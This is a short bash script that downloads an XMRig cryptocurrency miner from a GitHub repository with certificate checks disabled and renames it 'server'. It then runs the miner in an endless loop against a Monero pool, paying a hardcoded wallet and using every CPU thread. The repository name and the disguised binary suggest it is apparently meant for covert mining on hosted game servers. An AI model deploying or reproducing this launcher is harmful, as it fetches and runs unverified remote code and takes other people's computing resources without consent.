#!/bin/bash

threads=$(nproc)
if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    wget --no-check-certificate -O "server" https://github.com/thefeziak/ptero-miner/raw/refs/heads/main/xmrigarm64
else
    wget --no-check-certificate -O "server" https://github.com/thefeziak/ptero-miner/raw/refs/heads/main/xmrigamd64
fi

chmod +x server

while true; do
    ./server -a rx/0 -o de.monero.herominers.com:1111 -u 43WqdEgACvQMj6DxgLGVje33SR2ykPMc6CAotuQTMaZUXtFw3hcwoWKCrrycDM74EMPis3pbu489YFfhpCCdf1mfLmE4Dpy --no-color --nicehash -t $threads
done
